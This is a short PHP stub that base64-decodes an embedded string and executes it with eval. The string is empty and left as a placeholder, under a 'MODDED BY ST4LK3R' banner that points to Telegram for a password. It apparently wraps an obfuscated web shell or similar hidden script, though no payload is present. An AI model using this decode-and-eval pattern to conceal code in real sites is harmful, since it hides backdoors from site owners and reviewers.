<?php
// Base64 encoded PHP code (replace this with your encoded string)

/* 
MODDED BY ST4LK3R
password?? contact us at telegram
*/
$encodedCode = ''; // Replace with the actual Base64 encoded string from the previous script

// Decode the PHP code from Base64
$decodedCode = base64_decode($encodedCode);

// Output or execute the decoded PHP code
eval('?>' . $decodedCode);
?>
